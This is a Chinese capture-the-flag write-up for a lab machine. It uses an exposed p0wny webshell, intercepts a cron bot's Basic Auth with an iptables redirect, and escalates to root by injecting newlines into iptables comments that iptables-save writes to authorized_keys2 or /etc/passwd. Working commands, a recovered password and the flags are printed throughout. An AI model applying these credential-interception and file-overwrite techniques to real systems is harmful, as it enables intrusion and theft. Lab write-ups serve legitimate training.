> 来源：MazeSec
>
> 靶机ID：835
>
> 难度：Easy
>
> 靶机作者：II104567
>
> 宿主：`192.168.205.128`
>
> 靶机：`192.168.205.133`
>
> 辅助AI：deepseek-v4.1-flash
>
> 修订于 2026-11-25

## Flag

| Flag | 值                                            | 位置                  |
| ---- | --------------------------------------------- | --------------------- |
| user | `flag{user-0ec399c8e9b4e545cd89d1e981ee63b4}` | `/home/xfcy/user.txt` |
| root | `flag{root-e4fc1a50e49e37d4ba5cf32fc19a0350}` | `/root/root.txt`      |

## 关键信息

| 项                                   | 值                                                     |
| ------------------------------------ | ------------------------------------------------------ |
| 入口                                 | `http://192.168.205.133:8000/shell.php`                |
| Webshell                             | p0wny-shell                                            |
| 初始用户                             | `www-data`                                             |
| 横向用户                             | `xfcy` / `AMoLJ1C4Xf82fsaDuolY`                        |
| www-data 权限                        | `sudo iptables`（可改规则，不能直接写文件）            |
| xfcy 权限                            | `sudo iptables-save`（任意文件写）                     |
| 临时 root 用户（`/etc/passwd` 备选） | `pwned` / `pwn3d`                                      |
| 推荐 root 落点                       | `/root/.ssh/authorized_keys2`                          |
| 系统环境                             | Debian 13，iptables 1.8.11（nf_tables），Apache 2.4.71 |

## 攻击链

```text
8000/tcp  p0wny webshell (/shell.php)
  └─ www-data
      ├─ /home/xfcy/user.txt                         user flag
      ├─ sudo iptables                               （添加规则）
      └─ cron: xfcy /home/xfcy/bot.sh
            └─ curl --netrc-file /home/xfcy/.netrc → 127.0.0.1:8000
                  └─ iptables REDIRECT 抓包
                        └─ xfcy:AMoLJ1C4Xf82fsaDuolY
                              ├─ sudo iptables-save
                              │     └─ comment 注入 + iptables-save -f
                              │           └─ /root/.ssh/authorized_keys2
                              │                 └─ root SSH 登录
                              └─ /root/root.txt     root flag
```

## 一、信息收集

先做全端口扫描：

```bash
nmap -sC -sV -p- 192.168.205.133
```

```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
8000/tcp open  http    Apache httpd 2.4.71 ((Debian))
```

`8000` 是 Apache 默认页。常规目录爆破只看到 `index.html` 和 `server-status`（403）；换更大的文件字典后命中 `shell.php`：

```bash
ffuf -u http://192.168.205.133:8000/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \
  -t 60 -mc 200,301,302,403
```

```text
shell.php   [Status: 200, Size: 15207]
```

`shell.php` 是 p0wny-shell 的常见文件名，也可以直接访问确认，不必每次都依赖大字典。

## 二、入口：p0wny webshell

```bash
curl -s http://192.168.205.133:8000/shell.php | head
```

```html
<!DOCTYPE html>
<html>
<head>
    <title>p0wny@shell:~#</title>
...
```

它的协议很简单：`POST /shell.php?feature=shell`，参数 `cmd` 和 `cwd`，返回 base64 编码的 stdout：

```bash
curl -s -X POST "http://192.168.205.133:8000/shell.php?feature=shell" \
  --data-urlencode "cmd=id; hostname; uname -a" \
  --data-urlencode "cwd=/var/www/html"
```

```json
{"stdout":"dWlkPTMzKHd3dy1kYXRhK...","cwd":"L3Zhci93d3cvaHRtbA=="}
```

解码后：

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Takeover
Linux Takeover 7.3.5-1-liquorix-amd64 ...
```

可以封装成 helper，后续命令都通过它执行：

```bash
ws() {
  curl -s -X POST "http://192.168.205.133:8000/shell.php?feature=shell" \
    --data-urlencode "cmd=$1" \
    --data-urlencode "cwd=${2:-/var/www/html}" \
  | jq -r '.stdout' | base64 -d
}
```

## 三、user flag

`/home/xfcy` 目录是 `711`（可进入、不可列目录），但 `user.txt` 是 `644`：

```bash
ls -la /home
# drwx--x--x 2 xfcy xfcy 4096 ... xfcy

cat /home/xfcy/user.txt
```

```text
flag{user-0ec399c8e9b4e545cd89d1e981ee63b4}
```

这是典型的“目录不可读，但文件名可猜、文件本身 world-readable”问题。

## 四、www-data → xfcy：劫持 bot 的 Basic Auth

`www-data` 的 sudo 权限：

```bash
sudo -n -l
```

```text
User www-data may run the following commands on Takeover:
    (root) NOPASSWD: /usr/sbin/iptables
```

继续看 cron：

```bash
cat /etc/cron.d/takeover
```

```text
* * * * * xfcy /home/xfcy/bot.sh
```

`bot.sh` 是 `700 xfcy`，读不到；但日志 `/var/log/takeover_alive.log` 可读：

```bash
tail -3 /var/log/takeover_alive.log
```

```text
[xfcy:******] : 127.0.0.1 存活
[xfcy:******] : 127.0.0.1 存活
[xfcy:******] : 127.0.0.1 存活
```

日志每分钟一行，密码被 `******` 掩码。继续确认 bot 的行为：

```bash
ps -u xfcy -o pid=,args=
```

在 cron 触发的时间点附近，可以看到 bot 实际执行的命令：

```text
curl -fsS --netrc-file /home/xfcy/.netrc http://127.0.0.1:8000/shell.php -o /tmp/tmp.xxxx
```

这里有两个关键点：

- 密码不在命令行参数里，而是放在 `/home/xfcy/.netrc`；
- `.netrc` 的权限是 `600 xfcy`，`www-data` 读不到，`ps` 也看不到密码。

所以不能靠 `ps` 抓密码，必须做流量重定向。也可以用 iptables 计数器确认 bot 每分钟都会访问 `127.0.0.1:8000`：

```bash
sudo iptables -A OUTPUT -p tcp -d 127.0.0.1 --dport 8000 -j ACCEPT
sleep 70
sudo iptables -L OUTPUT -n -v
```

```text
pkts bytes target prot opt in out source destination
  12   932 ACCEPT tcp -- * * 0.0.0.0/0 127.0.0.1 tcp dpt:8000
```

确认后把这条计数器规则删掉：

```bash
sudo iptables -D OUTPUT -p tcp -d 127.0.0.1 --dport 8000 -j ACCEPT
```

用 `nat` 表的 `REDIRECT` 把 bot 发往 `127.0.0.1:8000` 的请求劫持到本地监听器。目标自带 busybox，可以直接用 `busybox nc` 代替 Python 脚本；如果目标没有 busybox，用 Python 的 `http.server` 或 `socat` 监听 8888 即可：

```bash
# 在 webshell 里启动监听器，收到请求后回一个最小的 200 响应
nohup sh -c 'printf "HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nok" | busybox nc -l -p 8888' \
  >/tmp/nccap.txt 2>&1 &

# 添加重定向
sudo iptables -t nat -A OUTPUT -p tcp -d 127.0.0.1 --dport 8000 \
  -j REDIRECT --to-ports 8888
```

等一分钟，`/tmp/nccap.txt` 出现：

```http
GET /shell.php HTTP/1.1
Host: 127.0.0.1:8000
Authorization: Basic eGZjeTpBTW9MSjFDNFhmODJmc2FEdW9sWQ==
User-Agent: curl/8.14.1
Accept: */*
```

解码 Basic Auth：

```bash
echo eGZjeTpBTW9MSjFDNFhmODJmc2FEdW9sWQ== | base64 -d
```

```text
xfcy:AMoLJ1C4Xf82fsaDuolY
```

清理规则和监听器：

```bash
sudo iptables -t nat -D OUTPUT -p tcp -d 127.0.0.1 --dport 8000 \
  -j REDIRECT --to-ports 8888
pkill -f '[b]usybox nc -l -p 8888'
rm -f /tmp/nccap.txt
```

SSH 登录 `xfcy`：

```bash
sshpass -p 'AMoLJ1C4Xf82fsaDuolY' ssh xfcy@192.168.205.133
```

```text
uid=1000(xfcy) gid=1000(xfcy) groups=1000(xfcy)
```

xfcy 的 sudo 权限：

```bash
sudo -n -l
```

```text
User xfcy may run the following commands on Takeover:
    (root) NOPASSWD: /usr/sbin/iptables-save
```

## 五、xfcy → root：iptables-save 任意文件写

`iptables-save -f <file>` 会用当前规则集**覆盖**目标文件。`iptables` 的 `-m comment --comment` 允许注释里带换行，`iptables-save` 会把这些换行原样输出。于是可以把想要写入文件的内容夹在两条换行之间，借 comment 把它“藏”进规则集，最后写入任意 root 可写的文件。

> 关键：这是两个用户配合的链路。`www-data` 有 `sudo iptables`，负责添加带 comment 的规则；`xfcy` 只有 `sudo iptables-save`，负责把规则集写文件。`xfcy` 不能执行 `sudo iptables`，`www-data` 也不能执行 `sudo iptables-save`。所以添加规则必须在 webshell（www-data）里做，`iptables-save` 必须在 xfcy 的 SSH 会话里做。

`-m comment` 的单条 comment 上限是 **255 字节**（ASCII 下即 255 个字符），不是 256 字节。在 nf_tables 后端，超长不会报错，而是静默截断到 255；所以每条 comment 必须控制在 255 字节以内，并按行边界分段。

### 5.1 推荐：写 `/root/.ssh/authorized_keys2`

这个落点要求目标满足三个条件：

- `/root/.ssh` 目录存在；
- sshd 的 `AuthorizedKeysFile` 包含 `.ssh/authorized_keys2`（Debian 默认包含）；
- sshd 允许 root 登录（本靶机为 `PermitRootLogin yes`）。

可以用下面的命令检查 sshd 配置：

```bash
grep -RE 'AuthorizedKeysFile|PermitRootLogin' /etc/ssh/sshd_config /etc/ssh/sshd_config.d/ 2>/dev/null
```

`/root/.ssh` 是否存在无法用普通用户直接确认；如果后面的 `iptables-save` 报 `No such file or directory`，说明目录不存在，改用 5.2 的 `/etc/passwd` 方案。

在攻击机生成密钥：

```bash
ssh-keygen -t ed25519 -f ./rootkey -N ''
```

把 `./rootkey.pub` 的内容写进 webshell 的临时文件（用引号 heredoc，避免变量展开；下面用占位符表示，替换成完整公钥）：

```bash
cat > /tmp/pub <<'EOF'
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA... kali@kali
EOF
```

以 `www-data` 添加 comment 规则：

```bash
sudo iptables -A INPUT -i lo -j ACCEPT -m comment --comment "
$(cat /tmp/pub)
"
```

确认注释被完整保留：

```bash
sudo iptables -S INPUT
```

```text
-A INPUT -i lo -m comment --comment "
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA... kali@kali
" -j ACCEPT
```

切到 `xfcy` 的 SSH 会话，把规则集写入 root 的 `authorized_keys2`：

```bash
sudo -n iptables-save -f /root/.ssh/authorized_keys2
```

回到攻击机，直接用密钥登录 root：

```bash
ssh -i ./rootkey root@192.168.205.133
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

这条路径比覆盖 `/etc/passwd` 干净得多：

- 不覆盖 `/etc/passwd`，不新建 UID 0 用户；
- 不改动原有的 `/root/.ssh/authorized_keys`；
- 清理时只需删除 `/root/.ssh/authorized_keys2`。

清理：

```bash
# 在 root 会话里
rm -f /root/.ssh/authorized_keys2
```

```bash
# 在 webshell 里删除 INPUT 规则；也可以按 iptables -S INPUT 显示的规则号删除
sudo iptables -D INPUT -i lo -j ACCEPT -m comment --comment "
$(cat /tmp/pub)
"
rm -f /tmp/pub
```

### 5.2 备选：写 `/etc/passwd`

如果目标没有 `/root/.ssh`，或者 sshd 不读取 `authorized_keys2`，可以退回 `/etc/passwd` 注入。注意这条路径会覆盖系统关键文件，操作前先备份，拿到 root 后立即恢复。

先从 webshell 备份到 `/dev/shm`。不要用 `/tmp`：Apache 的 `PrivateTmp=yes` 会让 webshell 的 `/tmp` 与 SSH/root 的 `/tmp` 相互隔离；`/dev/shm` 是共享的：

```bash
cp /etc/passwd /dev/shm/passwd.bak
```

生成 UID 0 用户 `pwned` 的密码 hash：

```bash
openssl passwd -6 -salt xfcy pwn3d
```

```text
$6$xfcy$7yKMXgIvhTafrK2YdCJlW/KYRMEflHTzBm6g7mKXy9A.qqKTw3I1secbTaWIHwYQ85iYov765W4dh2dE/HE/S/
```

准备两段注释文件（以下命令都在 webshell 里执行；使用引号 heredoc，避免 `$` 被展开）：

```bash
cat > /tmp/commentA.txt <<'EOF'
root:x:0:0:root:/root:/bin/bash
pwned:$6$xfcy$7yKMXgIvhTafrK2YdCJlW/KYRMEflHTzBm6g7mKXy9A.qqKTw3I1secbTaWIHwYQ85iYov765W4dh2dE/HE/S/:0:0:root:/root:/bin/bash
EOF

cat > /tmp/commentB.txt <<'EOF'
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
sshd:x:989:65534:sshd user:/run/sshd:/usr/sbin/nologin
xfcy:x:1000:1000::/home/xfcy:/bin/bash
EOF
```

> 不要把 `$6$xfcy$...` 直接写进双引号命令里，否则 shell 会把 `$6`、`$xfcy`、`$...` 展开。上面的 hash 必须放在文件中，再用 `$(cat ...)` 读取；或者整段使用单引号。

以 `www-data` 添加规则：

```bash
sudo iptables -A INPUT -i lo -j ACCEPT -m comment --comment "
$(cat /tmp/commentA.txt)
"

sudo iptables -A INPUT -i lo -j ACCEPT -m comment --comment "
$(cat /tmp/commentB.txt)
"
```

确认：

```bash
sudo iptables -S INPUT
```

```text
-A INPUT -i lo -m comment --comment "
root:x:0:0:root:/root:/bin/bash
pwned:$6$xfcy$...:0:0:root:/root:/bin/bash
" -j ACCEPT
-A INPUT -i lo -m comment --comment "
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
sshd:x:989:65534:sshd user:/run/sshd:/usr/sbin/nologin
xfcy:x:1000:1000::/home/xfcy:/bin/bash
" -j ACCEPT
```

以 `xfcy` 执行覆盖：

```bash
sudo -n iptables-save -f /etc/passwd
```

验证 NSS 能解析新用户：

```bash
getent passwd pwned
```

```text
pwned:$6$xfcy$...:0:0:root:/root:/bin/bash
```

登录 `pwned`（`su` 在 xfcy 的 SSH 会话里执行）：

```bash
su - pwned
# 或者在攻击机上：
sshpass -p 'pwn3d' ssh pwned@192.168.205.133
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

> 如果 sshd 的 `PermitRootLogin` 不是 `yes`，UID 0 用户 `pwned` 的密码 SSH 可能会被拒绝；此时在 xfcy 会话里执行 `su - pwned` 更稳。

恢复：

```bash
cat /dev/shm/passwd.bak > /etc/passwd
wc -c /etc/passwd        # 1218
getent passwd xfcy www-data sshd
```

清理临时规则并删除备份：

```bash
# 用 iptables -S INPUT 查看规则号后精确删除
iptables -D INPUT <num>
rm -f /dev/shm/passwd.bak
```

> `iptables-save -f` 会写出所有表，因此 `/etc/passwd` 中会夹带 `*filter`、`:INPUT ACCEPT [0:0]`、`COMMIT` 等行。glibc 的 passwd 解析会跳过这些无效行，但在恢复前不要运行 `pwck`、`vipw` 等严格校验工具。

## 六、root flag

```bash
cat /root/root.txt
```

```text
flag{root-e4fc1a50e49e37d4ba5cf32fc19a0350}
```